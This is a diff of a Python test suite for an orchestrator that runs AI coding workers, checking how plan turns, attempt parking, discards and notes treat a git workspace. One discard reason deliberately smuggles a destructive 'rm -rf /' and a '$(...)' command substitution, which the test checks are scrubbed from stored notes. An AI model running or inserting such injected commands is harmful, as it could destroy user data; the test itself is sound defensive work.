@@ -4,12 +4,14 @@ note framed against the anchor) - never left as clutter, never silently wiped.
 
 Evidence: C7a (plan store agent-bakeoff/findings/c7a-analysis-2026-10-11.md 3.3): the re-plan
 after a loop-guard stop ran in the still-dirty tree and `_revert_plan_turn_writes` wiped the
-coding turn's edits (3 of 10 editing turns). ao-planrevert's two rounds failed on the channel:
-the git proxy denies plumbing, and open-terminal's framing broke the parser. So every scenario
-here runs the bridge's REAL commands through a workspace whose `git` is the real
-`git_proxy.classify()` and whose output is framed like the real /check (tests/attempt_ws.py), and
-the same scenarios run against the REAL little-coder-open-terminal image when
-AO_ATTEMPT_OT_CONTAINER names an offline container of it.
+coding turn's edits (3 of 10 editing turns). ao-planrevert's two rounds failed on the channel
+(git proxy, open-terminal framing); ao-attempt round 1 failed partly because its tests replaced
+`router.exec_check`. So here EVERYTHING above the daemon is real: the Router (scheduler,
+workspace focus, the pre-turn probe, exec_check's instance guard), the plan gate, `_run_step`.
+Only the daemon's `/check` (FakeHarness.run_check) and the turns' file effects are fakes, and
+`/check` reaches a workspace whose `git` is the real `git_proxy.classify()` and whose output is
+framed like the real channel (tests/attempt_ws.py). The same scenarios run against the REAL
+little-coder-open-terminal image when AO_ATTEMPT_OT_CONTAINER names an offline container of it.
 
 Imports of `app.modules.attempts` are LOCAL to the tests that need it, so the base-compatible
 scenarios (C7a replay, plan-turn writes) run - and fail - against the pre-fix orchestrator.
@@ -20,6 +22,7 @@ from __future__ import annotations
 import asyncio
 import json
 import os
+import sys
 from pathlib import Path
 
 import pytest
@@ -28,12 +31,12 @@ from sqlalchemy import select
 from app.adapters.chat import FakeChatAdapter
 from app.config import Settings
 from app.db import Database
-from app.models import EffortConstraint, Event
+from app.models import EffortConstraint, Event, WorkerInstance
 from app.modules.model_router import FakeModelClient
 from app.orchestrator import Orchestrator
 from app.worker.harness import FakeHarness
 
-from attempt_ws import BASH, GIT, ContainerWS, LocalWS, daemon_frame
+from attempt_ws import BASH, GIT, REPO_ROOT, ContainerWS, LocalWS, daemon_frame
 
 ROOT = Path(__file__).resolve().parents[1]
 REPO = "https://github.com/acme/gym.git"
@@ -52,13 +55,13 @@ def _a():
     return attempts
 
 
-# ── harness ─────────────────────────────────────────────────────────────────────────────────
-async def _orch(db_url):
+# ── harness: real Router; fake daemon /check + fake turn effects ─────────────────────────────
+async def _orch(db_url, urls="http://w1:8090", workers=1):
     settings = Settings(
         _env_file=None, chat_adapter="fake",
         profiles_dir=str(ROOT / "profiles"), charters_dir=str(ROOT / "charters"),
-        floor_dir=str(ROOT / "floor"), worker_instance_urls="http://w1:8090",
-        max_concurrent_workers=1, database_url=db_url, project_survey_enabled=False,
+        floor_dir=str(ROOT / "floor"), worker_instance_urls=urls,
+        max_concurrent_workers=workers, database_url=db_url, project_survey_enabled=False,
         review_mode="off", plan_approval="off", worker_plan_gate="all",
     )
     db = Database(db_url)
@@ -81,23 +84,35 @@ async def _shutdown(orch, db):
     await db.dispose()
 
 
-def _wire(orch, ws, plan_actions: list):
-    """exec_check -> the workspace's bridge channel; a plan wake first performs the next queued
-    plan-turn action (what the read-only turn's shell did to the tree)."""
-    async def _exec(effort_id, *, command, session_id=None, **kw):
-        return await asyncio.to_thread(ws.bridge, command)
+def _wire(orch, ws, by_url: dict | None = None):
+    """The DAEMON's /check -> the workspace (per worker base_url when several); router.exec_check,
+    the scheduler and the focus map stay real. A plan / coding wake first performs the next
+    queued action of its kind (what that turn's shell did to the tree)."""
+    orch._plan_actions, orch._code_actions = [], []
 
-    orch.router.exec_check = _exec
-    orig = orch.router.wake
+    def _ws_for(base_url):
+        return (by_url or {}).get(base_url, ws)
 
-    async def _wake(*a, **kw):
-        if kw.get("plan_only") and plan_actions:
-            act = plan_actions.pop(0)
+    async def _check(base_url, command, *, cwd=None, timeout=600):
+        orch.harness.checks.append({"base_url": base_url, "command": command})
+        return await asyncio.to_thread(_ws_for(base_url).bridge, command)
+
+    async def _check_fn(base_url, command):
+        return await asyncio.to_thread(_ws_for(base_url).bridge, command)
+
+    orch.harness.run_check = _check
+    orch.harness.check_fn = _check_fn
+    orig = orch.harness.wake
+
+    async def _wake(base_url, session_id, prompt, **kw):
+        q = orch._plan_actions if kw.get("plan_only") else orch._code_actions
+        if q:
+            act = q.pop(0)
             if act is not None:
-                await asyncio.to_thread(act, ws)
-        return await orig(*a, **kw)
+                await asyncio.to_thread(act, _ws_for(base_url))
+        return await orig(base_url, session_id, prompt, **kw)
 
-    orch.router.wake = _wake
+    orch.harness.wake = _wake
 
 
 async def _effort(orch):
@@ -110,6 +125,13 @@ async def _effort(orch):
 async def _gate(orch, eid, chan, root, *replies):
     orch.harness.output_queue.extend(replies)
     return await orch._worker_plan_gate(eid, chan, root, GOAL, REPO, None, None, None)
+
+
+async def _code(orch, eid, chan, root, action, reply="done"):
+    """A coding turn through the real `_run_step` (router.wake: focus, the pre-turn probe)."""
+    orch._code_actions.append(action)
+    orch.harness.output_queue.append(reply)
+    return await orch._run_step(eid, chan, root, "execute the approved plan", 1, 1, REPO, False)
 
 
 async def _events(orch, eid, kind=None) -> list[dict]:
@@ -128,9 +150,19 @@ async def _notes(orch, eid) -> list[str]:
         return [r.body for r in rows]
 
 
+async def _attempt_row(orch, aid):
+    from app.models import EffortAttempt
+    async with orch.db.session_factory() as s:
+        return await s.get(EffortAttempt, aid)
+
+
 def _no_denials(ws):
-    denied = [c for c in ws.calls() if c.get("action") == "deny"]
+    denied = [c for c in ws.calls() if c.get("action") == "deny" or "DENIED" in json.dumps(c)]
     assert denied == [], f"the worker's git proxy denied: {denied}"
+
+
+def _branch(ws) -> str:
+    return ws.git("rev-parse", "--abbrev-ref", "HEAD").strip()
 
 
 def _base(ws) -> str:
@@ -160,44 +192,39 @@ def _plan_next(verdict: str) -> str:
             "ANCHOR ITEMS:\nA1: greet() returns a greeting\nA2: farewell() exists\n"
             "PLAN:\n1. document greet in README.md [anchor: A1]\n"
             "WON'T DO: nothing else\nRISKS: none\n"
-            f"VERDICT: {verdict}")
+            + (f"VERDICT: {verdict}" if verdict else ""))
 
 
-def _coding_turn(ws):
-    """What a coding turn leaves behind: an uncommitted edit and a new untracked file."""
-    ws.write("a.py", f"def greet():\n    return 'hello'  # {CONTENT_MARK}\n")
-    ws.write("b.py", f"def farewell():\n    return 'bye'  # {CONTENT_MARK}\n")
+def _edits(w):
+    """A coding turn: greet edited, b.py new - left uncommitted."""
+    w.write("a.py", f"def greet():\n    return 'hello'  # {CONTENT_MARK}\n")
+    w.write("b.py", f"def farewell():\n    return 'bye'  # {CONTENT_MARK}\n")
 
 
-async def _first_plan(orch, ws, eid, chan, root):
-    plan = await _gate(orch, eid, chan, root, PLAN_1)
-    assert plan is not None
-    _no_denials(ws)
+def _checks_reply(*lines) -> str:
+    return "done.\nCHECKS:\n" + "\n".join(lines) + "\n"
 
 
-# ── scenarios (run against the local framed workspace AND the real image) ─────────────────
+# ── scenarios (run on the framed local workspace AND the real image) ─────────────────────────
 async def scenario_keep(orch, ws):
-    """Acceptance: coding edits survive a no-write plan turn - parked, then kept as one commit
-    per completed step."""
+    """Coding edits survive a no-write plan turn: parked, then kept as one commit per step."""
     att = _a()
     s0 = _base(ws)
+    br = _branch(ws)
     eid, chan, root = await _effort(orch)
-    await _first_plan(orch, ws, eid, chan, root)
+    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
     stored = await _events(orch, eid, "plan_steps_stored")
     assert stored and stored[-1]["payload"]["anchors"] == ["A1", "A2"]
-    _coding_turn(ws)
-    await orch._record_worker_checks(eid, f"done.\nCHECKS:\nstep 1: sh check.sh {CMD_MARK}\n")
-    plan = await _gate(orch, eid, chan, root, _plan_next("KEEP 1,2"))
-    assert plan is not None
+    await _code(orch, eid, chan, root, _edits, _checks_reply(f"step 1: sh check.sh {CMD_MARK}"))
+    assert (await _attempt_row(orch, f"{eid}:a1")).start_sha == s0
+    assert await _gate(orch, eid, chan, root, _plan_next("KEEP 1-2")) is not None
     assert CONTENT_MARK in ws.read("a.py") and CONTENT_MARK in ws.read("b.py")
-    assert ws.git("status", "--porcelain").strip() == ""
-    log = ws.git("log", "--format=%s", f"{s0}..HEAD").splitlines()
+    assert ws.git("status", "--porcelain").strip() == "" and _branch(ws) == br
+    log = ws.git("log", "--format=%s", f"{s0}..{br}").splitlines()
     assert len(log) == 2 and "step 1" in log[1] and "step 2" in log[0]
-    first = ws.git("show", "--name-only", "--format=", "HEAD~1").split()
-    assert first == ["a.py"]                                   # step 1 = the file it names
-    assert ws.git("show", "--name-only", "--format=", "HEAD").split() == ["b.py"]
-    ref = att.ref_name(eid, 1)
-    assert CONTENT_MARK in ws.git("show", f"{ref}:b.py")       # the parked attempt, on its ref
+    assert ws.git("show", "--name-only", "--format=", f"{br}~1").split() == ["a.py"]
+    assert ws.git("show", "--name-only", "--format=", br).split() == ["b.py"]
+    assert CONTENT_MARK in ws.git("show", f"{att.ref_name(eid, 1)}:b.py")
     kept = await _events(orch, eid, "attempt_kept")
     assert kept and kept[-1]["payload"]["verified"] is True and kept[-1]["payload"]["commits"] == 2
     _no_denials(ws)
@@ -205,125 +232,206 @@ async def scenario_keep(orch, ws):
 
 
 async def scenario_discard(orch, ws):
-    """Acceptance: a discard resets the tree, the diff is on the hidden ref, the note is in the
-    plan (framed against the anchor), and a learning record is produced."""
+    """R3: with the real router, the first attempt's start is recorded (the worker COMMITS part
+    of its work itself); a discard resets the BRANCH to that start, the attempt is on its ref,
+    the note is in the plan, a v1-shaped learning record is produced."""
     att = _a()
     s0 = _base(ws)
+    br = _branch(ws)
     eid, chan, root = await _effort(orch)
-    await _first_plan(orch, ws, eid, chan, root)
-    _coding_turn(ws)
-    ws.write("check.sh", "echo 't.py::test_old FAILED'\necho 't_new.py::test_new FAILED'\nexit 1\n")
-    ws.write("t_new.py", "def test_new():\n    assert False\n")
-    await orch._record_worker_checks(eid, f"CHECKS:\nstep 1: sh check.sh {CMD_MARK}\n")
+    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+
+    def coding(w):
+        _edits(w)
+        w.git("add", "a.py")
+        w.git("commit", "-q", "-m", "worker commits greet")      # the worker's own commit
+        w.write("check.sh", "echo 't.py::test_old FAILED'\necho 't.py::test_added FAILED'\nexit 1\n")
+
+    await _code(orch, eid, chan, root, coding, _checks_reply(f"step 1: sh check.sh {CMD_MARK}"))
     reason = "farewell broke the greeting contract `rm -rf /` $(boom); it does not serve A2"
-    plan = await _gate(orch, eid, chan, root, _plan_next(f"DISCARD 2 deviation: {reason}"))
-    assert plan is not None
-    # the tree is back at the attempt's start
-    assert ws.git("rev-parse", "HEAD").strip() == s0
+    assert await _gate(orch, eid, chan, root, _plan_next(f"DISCARD 2 deviation: {reason}")) is not None
+    # the BRANCH (name and tip) is back at the attempt's start, worker commit included
+    assert _branch(ws) == br and ws.git("rev-parse", br).strip() == s0
     assert ws.git("status", "--porcelain").strip() == ""
     assert CONTENT_MARK not in ws.read("a.py") and ws.read("b.py") is None
-    # ...and the attempt is NOT lost: it is on the hidden ref
     ref = att.ref_name(eid, 1)
-    assert CONTENT_MARK in ws.git("show", f"{ref}:b.py")
-    assert CONTENT_MARK in ws.git("show", f"{ref}:a.py")
-    # facts: test_old passed at the start and fails now = REGRESSION; test_new is new, not a
-    # regression; both carry the anchor item of the step the worker attributed the check to
+    assert CONTENT_MARK in ws.git("show", f"{ref}:a.py") and CONTENT_MARK in ws.git("show", f"{ref}:b.py")
+    # R1: test_old passed at the start = regression; test_added is NEW (same, existing file)
     facts = (await _events(orch, eid, "attempt_facts"))[-1]["payload"]
     assert [f["test"] for f in facts["regression"]] == ["t.py::test_old"]
-    assert [f["test"] for f in facts["new_not_passing"]] == ["t_new.py::test_new"]
+    assert [f["test"] for f in facts["new_not_passing"]] == ["t.py::test_added"]
     assert {f["anchor"] for f in facts["regression"] + facts["new_not_passing"]} == {"A1"}
-    # the planner saw the facts and was asked about the anchor
-    plan_prompt = orch.harness.wakes[-1]["prompt"]
+    plan_prompt = [w for w in orch.harness.wakes if w["plan_only"]][-1]["prompt"]
     assert "REGRESSIONS" in plan_prompt and "VERDICT" in plan_prompt and "anchor" in plan_prompt
-    # the note: framed against the anchor, bounded, scrubbed of code and commands
     notes = await _notes(orch, eid)
     assert len(notes) == 1
     note = notes[0]
     assert "anchor item A2" in note and len(note) <= att.NOTE_MAX
     for bad in (CONTENT_MARK, CMD_MARK, "rm -rf", "$(", "`"):
         assert bad not in note
-    # the next plan turn carries it as WHAT NOT TO DO
-    assert "farewell broke the greeting contract" in note
     rec = await _events(orch, eid, "attempt_learning_record")
     assert rec and rec[-1]["payload"]["anchor"] == "A2"
-    from app.models import EffortAttempt
-    async with orch.db.session_factory() as s:
-        row = await s.get(EffortAttempt, f"{eid}:a1")
+    row = await _attempt_row(orch, f"{eid}:a1")
     assert row.state == "discarded" and row.learning_record["outcome"]["summary"] == note
     _no_denials(ws)
     return eid
 
 
 async def scenario_plan_writes(orch, ws):
-    """Acceptance: a plan turn that writes files is still reverted - in a clean tree, on top of a
-    parked attempt (only ITS writes go), and when it commits."""
+    """A plan turn that writes, commits, stages or switches branch is still reverted."""
     s0 = _base(ws)
+    br = _branch(ws)
     eid, chan, root = await _effort(orch)
 
     def plan_writes(w):
         w.write("c.py", "sneaky\n")
         w.write("a.py", "plan turn overwrote a.py\n")
 
-    # (a) clean tree
+    # (a) clean tree (first gate: no worker focused before the plan wake)
     orch._plan_actions.append(plan_writes)
-    await _first_plan(orch, ws, eid, chan, root)
+    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
     assert ws.read("c.py") is None and "base" in ws.read("a.py")
     assert ws.git("rev-parse", "HEAD").strip() == s0
-    # (b) a parked attempt: the plan turn's writes go, the attempt stays
-    _coding_turn(ws)
+    # (b) on top of a parked attempt: only the plan turn's writes go
+    await _code(orch, eid, chan, root, _edits)
     orch._plan_actions.append(plan_writes)
     await _gate(orch, eid, chan, root, _plan_next("KEEP 1,2"))
     assert ws.read("c.py") is None
     assert CONTENT_MARK in ws.read("a.py") and CONTENT_MARK in ws.read("b.py")
     assert ws.git("status", "--porcelain").strip() == ""
+    head = ws.git("rev-parse", "HEAD").strip()
 
-    # (c) the plan turn COMMITS its write
+    # (c) the plan turn COMMITS
     def plan_commits(w):
         w.write("d.py", "committed by the plan turn\n")
         w.git("add", "-A")
         w.git("commit", "-q", "-m", "plan turn commit")
 
-    head = ws.git("rev-parse", "HEAD").strip()
     orch._plan_actions.append(plan_commits)
-    await _gate(orch, eid, chan, root, _plan_next("KEEP 1").replace("VERDICT: KEEP 1", ""))
-    assert ws.read("d.py") is None
-    assert ws.git("rev-parse", "HEAD").strip() == head
+    await _gate(orch, eid, chan, root, _plan_next(""))
+    assert ws.read("d.py") is None and ws.git("rev-parse", "HEAD").strip() == head
     assert await orch._event_count(eid, "plan_turn_moved_head") == 1
 
-    # (d) the plan turn only STAGES its write (the unchanged check restores from the index)
+    # (d) the plan turn only STAGES
     def plan_stages(w):
         w.write("a.py", "staged by the plan turn\n")
         w.git("add", "a.py")
 
     orch._plan_actions.append(plan_stages)
-    await _gate(orch, eid, chan, root, _plan_next("KEEP 1").replace("VERDICT: KEEP 1", ""))
-    assert CONTENT_MARK in ws.read("a.py")
-    assert ws.git("status", "--porcelain").strip() == ""
-    assert ws.git("rev-parse", "HEAD").strip() == head
-    assert await orch._event_count(eid, "plan_turn_wrote_files") >= 4
+    await _gate(orch, eid, chan, root, _plan_next(""))
+    assert CONTENT_MARK in ws.read("a.py") and ws.git("status", "--porcelain").strip() == ""
+
+    # (e) the plan turn SWITCHES BRANCH and commits there
+    def plan_switches(w):
+        w.git("checkout", "-q", "-b", "plan-side")
+        w.write("e.py", "on another branch\n")
+        w.git("add", "-A")
+        w.git("commit", "-q", "-m", "side")
+
+    orch._plan_actions.append(plan_switches)
+    await _gate(orch, eid, chan, root, _plan_next(""))
+    assert _branch(ws) == br and ws.git("rev-parse", "HEAD").strip() == head
+    assert ws.read("e.py") is None and ws.git("status", "--porcelain").strip() == ""
+    _no_denials(ws)
+    return eid
+
+
+async def scenario_big_output(orch, ws):
+    """R2: two checks of ~400 long-id tests each (far past the 64 KB /check tail together), one
+    regression hidden in each: both are reported, with exact counts."""
+    _base(ws)
+    eid, chan, root = await _effort(orch)
+    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+    long = "tests/integration/test_" + "x" * 60 + "_behaviour.py::test_case_"
+    start = "".join(f"echo '{long}{i} PASSED'\n" for i in range(400))
+    ws.write("big1.sh", start)
+    ws.write("big2.sh", start.replace("behaviour", "contract"))
+    ws.git("add", "-A")
+    ws.git("commit", "-q", "-m", "suites")
+
+    def coding(w):
+        _edits(w)
+        w.write("big1.sh", start.replace(f"{long}377 PASSED", f"{long}377 FAILED")
+                + "head -c 300000 /dev/zero | tr '\\0' 'y'\necho\n")
+        w.write("big2.sh", start.replace("behaviour", "contract").replace(
+            "contract.py::test_case_5 PASSED", "contract.py::test_case_5 FAILED"))
+
+    await _code(orch, eid, chan, root, coding,
+                _checks_reply("step 1: sh big1.sh", "step 2: sh big2.sh"))
+    await _gate(orch, eid, chan, root, _plan_next("KEEP 1,2"))
+    facts = (await _events(orch, eid, "attempt_facts"))[-1]["payload"]
+    assert facts["untrusted_checks"] == []
+    assert facts["n_regression"] == 2
+    got = sorted(f["test"].rsplit("_", 1)[-1] for f in facts["regression"])
+    assert got == ["377", "5"]
+    _no_denials(ws)
+    return eid
+
+
+async def scenario_branch_moving_checks(orch, ws):
+    """R4: worker checks that move HEAD / the branch / switch branch / leave files: after the
+    park the BRANCH (name and tip) is exactly the parked attempt, and a KEEP lands on it."""
+    s0 = _base(ws)
+    br = _branch(ws)
+    eid, chan, root = await _effort(orch)
+    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+    ws.write("mv1.sh", "git reset -q HEAD~1\necho 't.py::test_old PASSED'\n")
+    ws.write("mv2.sh", "git commit -q --allow-empty -m by-check\n")
+    ws.write("mv3.sh", "git checkout -q -b check-side\necho stray > stray.txt\nexit 1\n")
+    ws.git("add", "-A")
+    ws.git("commit", "-q", "-m", "checks")
+    s1 = ws.git("rev-parse", "HEAD").strip()
+    await _code(orch, eid, chan, root, _edits, _checks_reply(
+        "step 1: sh mv1.sh", "step 1: sh mv2.sh", "step 2: sh mv3.sh"))
+    await _gate(orch, eid, chan, root, _plan_next("KEEP 1,2"))
+    assert _branch(ws) == br
+    assert CONTENT_MARK in ws.git("show", f"{br}:a.py") and CONTENT_MARK in ws.git("show", f"{br}:b.py")
+    assert ws.git("rev-parse", f"{br}~2").strip() == s1          # exactly two step commits
+    assert ws.read("stray.txt") is None and ws.git("status", "--porcelain").strip() == ""
+    kept = (await _events(orch, eid, "attempt_kept"))[-1]["payload"]
+    assert kept["verified"] is True
+    assert s0 != s1
+    _no_denials(ws)
+    return eid
+
+
+async def scenario_branch_moving_discard(orch, ws):
+    """R4: a check that commits onto the branch, then DISCARD: the branch is at the start."""
+    _base(ws)
+    br = _branch(ws)
+    eid, chan, root = await _effort(orch)
+    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+    ws.write("mv.sh", "git commit -q --allow-empty -m by-check\n")
+    ws.git("add", "-A")
+    ws.git("commit", "-q", "-m", "check")
+    s1 = ws.git("rev-parse", "HEAD").strip()
+    await _code(orch, eid, chan, root, _edits, _checks_reply("step 1: sh mv.sh"))
+    await _gate(orch, eid, chan, root, _plan_next("DISCARD 1 no-solution: greet still wrong for A1"))
+    assert _branch(ws) == br and ws.git("rev-parse", br).strip() == s1
+    assert CONTENT_MARK not in ws.git("show", f"{br}:a.py")
+    assert await orch._event_count(eid, "attempt_discarded") == 1
+    assert CONTENT_MARK in ws.git("show", f"{_a().ref_name(eid, 1)}:a.py")
     _no_denials(ws)
     return eid
 
 
 async def _run(db_url, ws, scenario):
     orch, db = await _orch(db_url)
-    orch._plan_actions = []
-    _wire(orch, ws, orch._plan_actions)
+    _wire(orch, ws)
     try:
         eid = await scenario(orch, ws)
-        # no file content and no command text in ANY audit payload
         blob = json.dumps(await _events(orch, eid))
         assert CONTENT_MARK not in blob and CMD_MARK not in blob
     finally:
         await _shutdown(orch, db)
 
 
-# ── Case 1 / 2 / 3 on the framed local workspace ─────────────────────────────────────────────
+# ── Case 1 / 2 / 3 ──────────────────────────────────────────────────────────────────────────
 async def test_case1_coding_edits_survive_a_no_write_plan_turn_kept_as_step_commits(db_url, tmp_path):
     await _run(db_url, LocalWS(tmp_path), scenario_keep)
 
 
-async def test_case2_a_discard_resets_the_tree_keeps_the_attempt_and_notes_why(db_url, tmp_path):
+async def test_case2_a_discard_resets_the_branch_to_the_recorded_start(db_url, tmp_path):
     await _run(db_url, LocalWS(tmp_path), scenario_discard)
 
 
@@ -362,26 +470,25 @@ C7A_PLAN = ("UNDERSTANDING: continue the queue fix\nALREADY DONE: the edits in t
             "WON'T DO: nothing else\nRISKS: none\nVERDICT: KEEP 1")
 
 
-@pytest.mark.parametrize("run", sorted(C7A_RUNS))
-async def test_case4_c7a_replay_keeps_the_coding_turns_edits(db_url, tmp_path, run):
+async def _c7a(db_url, ws, run):
     modified, added = C7A_RUNS[run]
-    ws = LocalWS(tmp_path)
     for p in modified:
         ws.write(p, f"original {p}\n")
     ws.git("add", "-A")
     ws.git("commit", "-q", "-m", "base")
     orch, db = await _orch(db_url)
-    orch._plan_actions = []
-    _wire(orch, ws, orch._plan_actions)
+    _wire(orch, ws)
     try:
         eid, chan, root = await _effort(orch)
-        # the coding turn (stopped by the loop guard) left these uncommitted
-        for p in modified:
-            ws.write(p, f"coding turn edit {p}\n")
-        for p in added:
-            ws.write(p, f"coding turn new file {p}\n")
-        # the re-plan: a read-only plan turn that writes nothing
-        assert await _gate(orch, eid, chan, root, C7A_PLAN) is not None
+
+        def coding(w):      # the coding turn (stopped by the loop guard) left these uncommitted
+            for p in modified:
+                w.write(p, f"coding turn edit {p}\n")
+            for p in added:
+                w.write(p, f"coding turn new file {p}\n")
+
+        await _code(orch, eid, chan, root, coding)
+        assert await _gate(orch, eid, chan, root, C7A_PLAN) is not None   # writes nothing
         for p in modified:
             assert ws.read(p) == f"coding turn edit {p}\n", p
         for p in added:
@@ -392,13 +499,17 @@ async def test_case4_c7a_replay_keeps_the_coding_turns_edits(db_url, tmp_path, r
         await _shutdown(orch, db)
 
 
+@pytest.mark.parametrize("run", sorted(C7A_RUNS))
+async def test_case4_c7a_replay_keeps_the_coding_turns_edits(db_url, tmp_path, run):
+    await _c7a(db_url, LocalWS(tmp_path), run)
+
+
 # ── Case 5: plan steps carry a declared anchor item; refused once, then escalated ─────────────
 async def test_case5_a_plan_without_anchor_items_is_refused_once_then_escalated(db_url, tmp_path):
     ws = LocalWS(tmp_path)
     _base(ws)
     orch, db = await _orch(db_url)
-    orch._plan_actions = []
-    _wire(orch, ws, orch._plan_actions)
+    _wire(orch, ws)
     try:
         eid, chan, root = await _effort(orch)
         bare = "UNDERSTANDING: x\nPLAN:\n1. edit a.py\nWON'T DO: y\nRISKS: none"
@@ -414,10 +525,9 @@ async def test_case5_a_plan_without_anchor_items_is_refused_once_then_escalated(
 
 async def test_case5_refused_once_then_a_declared_plan_is_stored_before_delegation(db_url, tmp_path):
     ws = LocalWS(tmp_path)
-    _base(ws)
+    s0 = _base(ws)
     orch, db = await _orch(db_url)
-    orch._plan_actions = []
-    _wire(orch, ws, orch._plan_actions)
+    _wire(orch, ws)
     try:
         eid, chan, root = await _effort(orch)
         bare = "UNDERSTANDING: x\nPLAN:\n1. edit a.py\nWON'T DO: y\nRISKS: none"
@@ -429,67 +539,89 @@ async def test_case5_refused_once_then_a_declared_plan_is_stored_before_delegati
         assert stored["anchors"] == ["A1", "A2"] and stored["items"] == ["A1", "A2"]
         plan = await orch._effort_plan_row(eid)
         assert [s["anchor"] for s in plan["steps"]] == ["A1", "A2"]
+        # R3: the first attempt's start is recorded right after the first plan turn
+        row = await _attempt_row(orch, f"{eid}:a1")
+        assert row.start_sha == s0 and row.start_src == "plan" and row.start_branch == _branch(ws)
     finally:
         await _shutdown(orch, db)
 
 
-# ── Case 6: an unparseable verdict never discards ─────────────────────────────────────────────
+# ── Case 6: an unparseable verdict never discards; a KEEP that mis-attributes is asked again ──
 async def test_case6_an_unparseable_verdict_keeps_the_attempt_parked_and_escalates(db_url, tmp_path):
     att = _a()
     ws = LocalWS(tmp_path)
     _base(ws)
     orch, db = await _orch(db_url)
-    orch._plan_actions = []
-    _wire(orch, ws, orch._plan_actions)
+    _wire(orch, ws)
     try:
         eid, chan, root = await _effort(orch)
-        await _first_plan(orch, ws, eid, chan, root)
-        _coding_turn(ws)
-        no_verdict = _plan_next("KEEP 1").replace("VERDICT: KEEP 1", "VERDICT: maybe later")
+        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+        await _code(orch, eid, chan, root, _edits)
+        no_verdict = _plan_next("maybe later")
         assert await _gate(orch, eid, chan, root, no_verdict, no_verdict) is None
         assert await orch._event_count(eid, "attempt_verdict_unparseable") == 2
         assert await orch._event_count(eid, "attempt_discarded") == 0
         assert await orch._event_count(eid, "worker_plan_stopped") == 1
-        # parked: committed, on its ref, tree clean, nothing lost
         assert CONTENT_MARK in ws.read("a.py") and CONTENT_MARK in ws.read("b.py")
         ref = att.ref_name(eid, 1)
         assert ws.git("rev-parse", ref).strip() == ws.git("rev-parse", "HEAD").strip()
         assert ws.git("status", "--porcelain").strip() == ""
-        # the re-ask asked for the verdict, with the attempt
         assert "no single, valid VERDICT" in orch.harness.wakes[-1]["prompt"]
         _no_denials(ws)
     finally:
         await _shutdown(orch, db)
 
 
-# ── Case 7: three discards of the same step escalate once, classified ─────────────────────────
+async def test_case6_a_keep_that_leaves_out_a_changed_step_is_asked_again(db_url, tmp_path):
+    ws = LocalWS(tmp_path)
+    _base(ws)
+    br = _branch(ws)
+    orch, db = await _orch(db_url)
+    _wire(orch, ws)
+    try:
+        eid, chan, root = await _effort(orch)
+        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+        await _code(orch, eid, chan, root, _edits)
+        # KEEP 1 would commit step 2's b.py as "step 1": asked again, then the full KEEP lands
+        assert await _gate(orch, eid, chan, root, _plan_next("KEEP 1"),
+                           _plan_next("KEEP 1 and 2")) is not None
+        assert await orch._event_count(eid, "attempt_keep_conflict") == 1
+        assert "b.py" in orch.harness.wakes[-1]["prompt"]
+        log = ws.git("log", "--format=%s", "-2", br).splitlines()
+        assert "step 2" in log[0] and "step 1" in log[1]
+    finally:
+        await _shutdown(orch, db)
+
+
+# ── Case 7: three discards of one step escalate once; renumbering does not reset it ──────────
 async def test_case7_three_discards_of_one_step_escalate_once_with_context(db_url, tmp_path):
     ws = LocalWS(tmp_path)
     s0 = _base(ws)
+    br = _branch(ws)
     orch, db = await _orch(db_url)
-    orch._plan_actions = []
-    _wire(orch, ws, orch._plan_actions)
+    _wire(orch, ws)
     try:
         eid, chan, root = await _effort(orch)
-        await _first_plan(orch, ws, eid, chan, root)
+        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
         results = []
         for i in range(4):
-            ws.write("a.py", f"attempt {i} {CONTENT_MARK}\n")
+            await _code(orch, eid, chan, root,
+                        lambda w, i=i: w.write("a.py", f"attempt {i} {CONTENT_MARK}\n"))
+            # the re-plan RENUMBERS the greet item (A7, same text) from round 2 on
+            plan = PLAN_1 if i == 0 else PLAN_1.replace("A1:", "A7:").replace("anchor: A1", "anchor: A7")
             results.append(await _gate(
                 orch, eid, chan, root,
-                PLAN_1 + f"\nVERDICT: DISCARD 1 no-solution: try {i} did not make greet return a greeting"))
-            assert ws.git("rev-parse", "HEAD").strip() == s0
-            assert "base" in ws.read("a.py")
+                plan + f"\nVERDICT: DISCARD 1 no-solution: try {i} did not make greet return a greeting"))
+            assert ws.git("rev-parse", br).strip() == s0 and "base" in ws.read("a.py")
         assert results[0] is not None and results[1] is not None
         assert results[2] is None                       # the third discard escalated
         esc = await _events(orch, eid, "attempt_step_escalated")
-        assert len(esc) == 1                            # once, not again on the fourth
+        assert len(esc) == 1
         p = esc[0]["payload"]
         assert p["anchor"] == "A1" and p["discards"] == 3 and p["class"] == "no-solution-identified"
         assert len(p["attempts"]) == 3 and all(r.startswith("ao-attempts/") for r in p["refs"])
         posted = [m["message"] for m in orch.chat.posted if "discarded 3 times" in m["message"]]
         assert posted and "anchor item **A1**" in posted[0]
-        # notes are capped and every one is framed against the anchor
         notes = await _notes(orch, eid)
         assert 1 <= len(notes) <= _a().NOTES_CAP and all("anchor item A1" in n for n in notes)
         _no_denials(ws)
@@ -499,8 +631,6 @@ async def test_case7_three_discards_of_one_step_escalate_once_with_context(db_ur
 
 async def test_case7_notes_are_capped_in_count(db_url, tmp_path):
     att = _a()
-    ws = LocalWS(tmp_path)
-    _base(ws)
     orch, db = await _orch(db_url)
     try:
         eid, _c, _r = await _effort(orch)
@@ -512,17 +642,24 @@ async def test_case7_notes_are_capped_in_count(db_url, tmp_path):
         await _shutdown(orch, db)
 
 
+def test_case7_items_are_canonical_across_re_plans():
+    att = _a()
+    merged, alias = att.canonical_items({"A1": "greet works"}, {"A3": "Greet works.", "A1": "other",
+                                                                "A2": "new thing"})
+    assert merged == {"A1": "greet works", "A2": "new thing"}
+    assert alias == {"A3": "A1", "A1": "A1", "A2": "A2"}
+
+
 # ── Case 8: refs expire at delivery ───────────────────────────────────────────────────────────
 async def test_case8_attempt_refs_expire_at_delivery(db_url, tmp_path):
     ws = LocalWS(tmp_path)
     orch, db = await _orch(db_url)
-    orch._plan_actions = []
-    _wire(orch, ws, orch._plan_actions)
+    _wire(orch, ws)
     try:
         _base(ws)
         eid, chan, root = await _effort(orch)
-        await _first_plan(orch, ws, eid, chan, root)
